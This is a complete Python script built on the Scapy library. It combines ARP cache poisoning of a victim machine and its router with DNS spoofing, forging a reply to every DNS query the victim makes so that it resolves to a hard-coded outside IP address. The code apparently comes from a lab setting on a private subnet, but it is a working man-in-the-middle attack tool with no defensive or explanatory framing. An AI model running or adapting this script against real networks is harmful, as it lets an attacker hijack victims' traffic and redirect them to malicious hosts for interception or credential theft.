from scapy.all import * 
import threading, time 

victimMAC = "00:0c:29:19:5c:f2" 
victimIP  = "192.168.28.133"

localIP = "192.168.28.128"
localMAC = "00:0c:29:19:18:f6" 

routerMAC = "00:50:56:f7:bc:e1"
routerIP = "192.168.28.2"
global targetIP
targetIP = "54.194.124.171" # REMA IP 

def arpPoison(localMAC, victimMAC, routerMAC):

	'''  
	Construct and sends the appropriate ARP packets to reset the ARP caches of the router and victim machine.
	op = 1 -> who-has ? 
	op = 2 -> is-at
	'''
	victim_packet = Ether(src=localMAC, dst=victimMAC)/ARP(hwsrc=localMAC, hwdst=victimMAC, psrc=routerIP, pdst=victimIP, op=2)
	router_packet = Ether(src=localMAC, dst=routerMAC)/ARP(hwsrc=localMAC, hwdst=routerMAC, psrc=victimIP, pdst=routerIP, op=2)
	print("ARP Poison to: " + str(victimIP))
	while True: 
		try: #sendp() function works at layer 2
			sendp(victim_packet, verbose=0)
			sendp(router_packet, verbose=0)
			time.sleep(3)
		except KeyboardInterrupt:
			sys.exit(0)


def dnsSpoof():
	print("DNS Spoofing")
	dns_filter = "udp and port 53 and src " + str(victimIP)
	sniff(filter=dns_filter, prn=checkPacket)

def checkPacket(packet):
	''' 
	Check if filtered packet is a dns request
	packet.getlayer(DNS).qr = 0 -> DNS query 
	packet.getlayer(DNS).qr = 1 -> DNS respond
	'''
	if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
		response_packet = (IP(dst=victimIP, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=targetIP)))

		send(response_packet, verbose=0)

		print ("DNS Requested: ", packet[DNS].qd.qname)
		print ("Received: "+ str(targetIP))

        

def main():
	arp_thread = threading.Thread(target=arpPoison, args=(localMAC, victimMAC, routerMAC))
	dns_thread = threading.Thread(target=dnsSpoof)
	
	arp_thread.daemon = True;
	dns_thread.daemon = True;

	arp_thread.start()
	dns_thread.start()

	while True: 
		try:
			time.sleep(1)
		except KeyboardInterrupt:
			print("Attack Done")
			sys.exit(0)

if __name__ == '__main__':
	main()
